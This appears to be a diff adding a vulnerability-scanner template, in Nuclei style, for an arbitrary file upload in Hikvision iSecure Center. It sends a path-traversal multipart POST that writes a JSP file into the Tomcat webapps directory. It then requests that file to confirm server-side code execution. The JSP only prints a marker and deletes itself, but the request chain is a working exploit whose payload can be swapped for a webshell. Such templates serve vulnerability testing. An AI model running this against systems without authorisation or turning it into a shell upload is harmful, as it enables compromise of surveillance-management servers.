@@ -1,0 +1,44 @@
+http:
+    - matchers:
+        - dsl:
+            - contains(body_2, '{{a2}}')
+          type: dsl
+      raw:
+        - |
+          POST /center/api/clusters/ssl/file;.js HTTP/1.1
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+          Accept: */*
+          Host: {{Hostname}}
+          Accept-Encoding: gzip, deflate
+          Content-Type: multipart/form-data; boundary=--------------------------{{a3}}
+
+          ----------------------------{{a3}}
+          Content-Disposition: form-data; name="file"; filename="../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{a1}}.jsp"
+          Content-Type: application/octet-stream
+
+          <%out.println("{{a2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+          ----------------------------{{a3}}
+          Content-Disposition: form-data; name="proxyAddress"
+
+          127.0.0.1
+          ----------------------------{{a3}}--
+        - |
+          GET /clusterMgr/{{a1}}.jsp;.js HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          Accept-Encoding: gzip, deflate
+id: hikvision-isecurecenter-clusters-fileupload
+info:
+    author: hikvision-isecurecenter-clusters-fileupload
+    name: hikvision-isecurecenter-clusters-fileupload
+    severity: high
+    tags:
+        - tomcat
+        - Cluster
+        - Servlet
+        - Apache-Tomcat
+variables:
+    a1: '{{rand_base(5)}}'
+    a2: '{{rand_base(10)}}'
+    a3: '{{rand_base(20)}}'
